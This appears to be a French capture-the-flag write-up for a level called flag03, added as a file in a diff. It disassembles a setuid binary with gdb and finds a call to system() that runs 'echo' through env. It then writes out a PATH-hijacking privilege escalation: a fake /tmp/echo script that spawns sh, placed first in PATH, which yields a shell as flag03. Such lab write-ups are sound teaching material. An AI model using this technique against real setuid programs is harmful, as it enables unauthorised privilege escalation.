@@ -1,0 +1,26 @@
+On desassemble le binaire avec gdb : disass main
+
+On remarque ces lignes :
+
+0x080484f7 <+83>:	movl   $0x80485e0,(%esp) 
+0x080484fe <+90>:	call   0x80483b0 <system@plt>
+on voit avec gdb le contenu  de 0x80485e0 qui va servir d'argument a system().
+
+x/s 0x80485e0.
+on voit : 0x80485e0:	 "/usr/bin/env echo Exploit me"
+
+On cree un executable dans /tmp/truc.sh qui contient :
+
+#!/bin/sh
+sh
+
+On le rend executable : chmod +x /tmp/truc.sh
+On met dans le path /tmp en premier.
+On renomme notre binaire en "echo" : mv /tmp/truc.sh /tmp/echo
+
+Donc maintenant lorsqu'on veut lancer le premier echo de l'environnement on va lancer celui de /tmp, donc le notre.
+Le programme appelant va donc lancer un shell. Comme il a le setuid, (on le voit avec ls -l), le shell sera lance avec les privileges de flag03. En plus on, a vu dans l'assembleur les instructions :
+setresgid(getegid(), getegid(), getegid());
+et
+setresuid(geteuid(), geteuid(), geteuid());
+Donc le shell sera lance en tant que flag03 !
